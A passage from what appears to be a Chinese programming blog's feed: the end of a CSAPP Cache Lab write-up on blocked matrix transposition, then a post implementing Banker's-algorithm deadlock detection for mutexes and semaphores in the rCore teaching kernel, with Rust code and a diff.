<span class="token number">4</span><span class="token punctuation">)</span><span class="token function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></code></pre><p>然后将这些函数注册到 <code>registerFunctions</code> 中，使用 <code>test-trans</code> 即可对所有注册的矩阵转置函数进行测试。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">registerFunctions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/* Register your solution function */</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>transpose_submit<span class="token punctuation">,</span> transpose_submit_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">/* Register any additional transpose functions */</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>trans<span class="token punctuation">,</span> trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Blocked</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>blocked4_4_trans<span class="token punctuation">,</span> blocked4_4_trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>blocked5_5_trans<span class="token punctuation">,</span> blocked5_5_trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>blocked20_20_trans<span class="token punctuation">,</span> blocked20_20_trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>经过暴力枚举，发现在 $32×32$、$64×64$、$61×67$ 下的最优矩阵分块大小分别为 8、4、17，在 <code>transpose-submit</code> 函数中根据 M、N 的值分别调用适合的转置函数，得分如下：</p><p><img src="/2024/12/17/CSAPP-Cache-Lab/optim1.png" alt></p><h2 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h2><p>在上面的分块转置模板中，矩阵 $A$ 和 $B$ 是交替进行访问的，这可能导致矩阵 $A$ 访问的块马上又在访问矩阵 $B$ 时被置换，因此可以将最内层循环进行展开，对于分块大小为 $bsize$ 的转置方法，先连续访问完 $A$ 的一个 $1×bsize$ 的切片，将其暂存入变量中，再连续访问 $B$ 的 $bsize×1$ 切片。</p><p>将 $32×32$ 和 $64×64$ （$61×67$ 的测试样例已得满分，没有选择进一步优化）的对应的分块转置方法的内层循环展开后，得分如下：</p><p><img src="/2024/12/17/CSAPP-Cache-Lab/optim2.png" alt></p><p>这样，$32×32$ 也得到了满分，但是 $64×64$ 分数仍然比较低，看来简单的分块方法还不够，可能需要针对 Cache 的参数将矩阵元素访问顺序进行重排，这部分我暂时没有完成，之后有时间可以再尝试一下。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本 Lab 主要考察对计算机高速缓存（Cache）机制的理解，以及如何针对 Cache 进行程序的优化，对应知识点为书中的 6.4 ~ 6.6 节内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="矩阵" scheme="http://lordaeronesz.github.io/tags/%E7%9F%A9%E9%98%B5/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter8练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/04/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter8%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/04/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter8%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-04T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:44.447Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>本实验要求为死锁和信号量机制实现死锁检测功能，并提供系统调用 <code>enable_deadlock_detect</code>，用以开启和关闭死锁检测功能。在开启死锁检测功能的情况下，用户使用 <code>mutex_lock</code> 或 <code>semaphore_down</code> 尝试获取互斥资源时，如果发现系统处于不安全状态（可能发生死锁）时拒绝对应的资源获取请求。</p><p>实验手册中介绍的死锁检测算法为银行家算法（Banker\’s Algorithm），由 Dijkstra 提出，算法的流程可以参照<a href="https://learningos.cn/rCore-Tutorial-Guide-2024A/chapter8/5exercise.html">手册</a>，这里不再详细介绍，代码实现如下：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Banker's Algoritm for dead lock check</span><span class="token keyword">fn</span> <span class="token function-definition function">deadlock_check</span><span class="token punctuation">(</span>available<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> allocation<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span><span class="token punctuation">,</span> need<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// n: thread count  m: resources count</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>allocation<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allocation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> work <span class="token operator">=</span> available<span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> finish <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token boolean">false</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">loop</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> idx <span class="token operator">=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>n <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> finish<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>m <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> need<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> work<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> flag <span class="token punctuation">&#123;</span>                idx <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// has found a thread meet the requirement</span>        <span class="token keyword">if</span> idx <span class="token operator">!=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>m <span class="token punctuation">&#123;</span>                work<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> allocation<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            finish<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    finish<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token operator">&amp;</span>x<span class="token closure-punctuation punctuation">|</span></span> x<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>根据现有的 Available, Allocation 和 Need 来进行死锁的检测并不复杂，关键在于如何将这一算法融入现有的线程互斥机制中，更具体地说，如何维护内核中与此相关的状态，以便在进行死锁检测前能够正确构造出 Available, Allocation 和 Need 数据结构。</p><p>不妨先考虑更简单的情况：要想为锁机制实现死锁检测，如何维护其状态？首先需要保存当前线程需要哪把锁，需要明确的一点是：每个线程“需要”的资源只有 1 个，因为每个线程只有当所需的资源被满足后才会继续执行以获取更多资源，否则就会被阻塞。因此可以为线程控制块添加一个 <code>usize</code> 变量 <code>mutex_need</code> 来存储该线程当前需要锁资源的 id。除此之外，还需要一个向量 <code>mutex_allocation</code> 来存储线程已获取未释放锁资源的 id。</p><p>当使用 <code>sys_mutex_lock(mutex_id)</code> 尝试获取 <code>mutex_id</code> 的锁时，在使用 <code>mutex.lock()</code> 实际获取锁之前，将当前线程的 <code>mutex_need</code> 设置为 <code>mutex_id</code>，当线程成功获取锁资源后，将 <code>mutex_id</code> 放入 <code>mutex_allocation</code> 向量中，并将 <code>mutex_need</code> 设置为空（我这里采用的是将 <code>usize::MAX</code> 看作空，也可以使用 <code>Option</code> 类型，相对来说更优雅）。</p><p>当使用 <code>sys_mutex_unlock(mutex_id)</code> 尝试释放 <code>mutex_id</code> 的锁时，在使用 <code>mutex.unlock()</code> 实际释放锁之前，查找当前线程的 <code>mutex_allocation</code> 向量，移除值为 <code>mutex_id</code> 的元素。</p><p>实现上述逻辑后，就能在进行死锁检测前，根据所维护的信息将 Available, Allocation 和 Need 构造出来，作为银行家算法的参数，检测当前系统是否处于不安全状态，构造代码如下所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> process_inner<span class="token punctuation">.</span>dlcheck_option <span class="token punctuation">&#123;</span>    <span class="token comment">// initialize data structure for Banker's Algorithm:</span>    <span class="token comment">// Avavilable Vector, Allocation Matrix, Need Matrix</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> process_inner<span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> m <span class="token operator">=</span> process_inner<span class="token punctuation">.</span>mutex_list<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> available<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> allocation<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> need<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> task_opt<span class="token punctuation">)</span> <span class="token keyword">in</span> process_inner<span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">match</span> task_opt <span class="token punctuation">&#123;</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> task_inner <span class="token operator">=</span> task<span class="token punctuation">.</span><span class="token function">inner_exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token operator">&amp;</span>task_inner<span class="token punctuation">.</span>mutex_allocation <span class="token punctuation">&#123;</span>                    allocation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span>mid<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    available<span class="token punctuation">[</span><span class="token operator">*</span>mid<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">let</span> nid <span class="token operator">=</span> task_inner<span class="token punctuation">.</span>mutex_need<span class="token punctuation">;</span>                <span class="token keyword">if</span> nid <span class="token operator">!=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span> <span class="token punctuation">&#123;</span>                    need<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>nid<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">drop</span><span class="token punctuation">(</span>task_inner<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token operator">!</span><span class="token function">deadlock_check</span><span class="token punctuation">(</span>available<span class="token punctuation">,</span> allocation<span class="token punctuation">,</span> need<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">0xDEAD</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>信号量机制的实现大体相似，不过需要注意一些细节。</p><p>因为信号量的数量不再是二值的（有或没有），因此线程的资源分配向量中还需要包含每个信号量的数量，向量的元素可以选择用 <code>&lt;sem_id, cnt&gt;</code> 这样的二元组来表示，也可以用 <code>cnt</code> 个 <code>sem_id</code> 元素来表示这么一个二元组，我在这里采用的是前者。</p><p>另外，信号量还可以为负数，负数信号量的绝对值表示当前资源被提前“透支”的数量，而在银行家算法中，资源数量 <code>Available[i][j]</code> 不能为负数，此时应该将其看作 0。</p><pre class="language-rust" data-language="rust"><code class="language-rust">available<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span>sem_inner<span class="token punctuation">.</span>count<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后，当线程 A 提前“透支”信号量进入休眠状态，线程 B 释放资源后调用 <code>wakeup_task(task)</code> 尝试唤醒线程 A 前，设置线程 A 的 <code>sem_allocation</code> 向量。否则可能由于线程调度的不确定性，导致线程 B 在被 <code>sem_allocation</code> 未被设置的情况下被调度，从而后续的死锁检测出现错误，让系统意外地进入死锁的状态。</p><blockquote><p>有关这样做法的合理性原因，我也不是很确定，因为我在未遵守上述顺序的情况下，执行 <code>ch8_deadlock_sem2</code> 进入死锁的几率非常大（大约 90%），而这应该不全是线程调度的随机性所导致。</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/sync/semaphore.rs b/os/src/sync/semaphore.rsindex 509b504..5743172 100644<span class="token coord">--- a/os/src/sync/semaphore.rs</span><span class="token coord">+++ b/os/src/sync/semaphore.rs</span>@@ -36,6 +36,15 @@ impl Semaphore &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        inner.count += 1;</span><span class="token prefix unchanged"> </span><span class="token line">        if inner.count &lt;= 0 &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            if let Some(task) = inner.wait_queue.pop_front() &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                let sem_id = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">                match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    Some(index) => task_inner.sem_allocation[index].1 += 1,</span><span class="token prefix inserted">+</span><span class="token line">                    None => task_inner.sem_allocation.push((sem_id, 1)),</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.sem_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">                drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                wakeup_task(task);</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span></span>@@ -50,6 +59,17 @@ impl Semaphore &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.wait_queue.push_back(current_task().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">            drop(inner);</span><span class="token prefix unchanged"> </span><span class="token line">            block_current_and_run_next();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">            let sem_id = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">            match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(index) => task_inner.sem_allocation[index].1 += 1,</span><span class="token prefix inserted">+</span><span class="token line">                None => task_inner.sem_allocation.push((sem_id, 1)),</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            task_inner.sem_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">            drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">            drop(task);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 31fa22a..82c0991 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,11 +1,13 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    fs::&#123;open_file, OpenFlags&#125;,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_ref, translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;translated_byte_buffer, translated_ref, translated_refmut, translated_str&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">        current_process, current_task, current_user_token, exit_current_and_run_next, pid2process,</span><span class="token prefix unchanged"> </span><span class="token line">        suspend_current_and_run_next, SignalFlags, TaskStatus,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::&#123;string::String, sync::Arc, vec::Vec&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -164,10 +166,24 @@ pub fn sys_kill(pid: usize, signal: u32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().process.upgrade().unwrap().getpid()</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// task_info syscall</span></span>diff --git a/os/src/syscall/sync.rs b/os/src/syscall/sync.rsindex 290ee6f..6d25e65 100644<span class="token coord">--- a/os/src/syscall/sync.rs</span><span class="token coord">+++ b/os/src/syscall/sync.rs</span><span class="token coord">@@ -1,7 +1,11 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::cmp::max;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::&#123;Condvar, Mutex, MutexBlocking, MutexSpin, Semaphore&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::&#123;block_current_and_run_next, current_process, current_task&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::timer::&#123;add_timer, get_time_ms&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use alloc::vec;</span><span class="token prefix inserted">+</span><span class="token line">use alloc::vec::Vec;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// sleep syscall</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_sleep(ms: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span>@@ -71,9 +75,75 @@ pub fn sys_mutex_lock(mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // set mutex_need to current</span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_need = mutex_id;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    if process_inner.dlcheck_option &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // initialize data structure for Banker's Algorithm:</span><span class="token prefix inserted">+</span><span class="token line">        // Avavilable Vector, Allocation Matrix, Need Matrix</span><span class="token prefix inserted">+</span><span class="token line">        let n = process_inner.tasks.len();</span><span class="token prefix inserted">+</span><span class="token line">        let m = process_inner.mutex_list.len();</span><span class="token prefix inserted">+</span><span class="token line">        let mut available: Vec&lt;usize> = vec![1; m];</span><span class="token prefix inserted">+</span><span class="token line">        let mut need: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        let mut allocation: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    for mid in &amp;task_inner.mutex_allocation &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        allocation[i][*mid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                        available[*mid] -= 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    let nid = task_inner.mutex_need;</span><span class="token prefix inserted">+</span><span class="token line">                    if nid != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        need[i][nid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                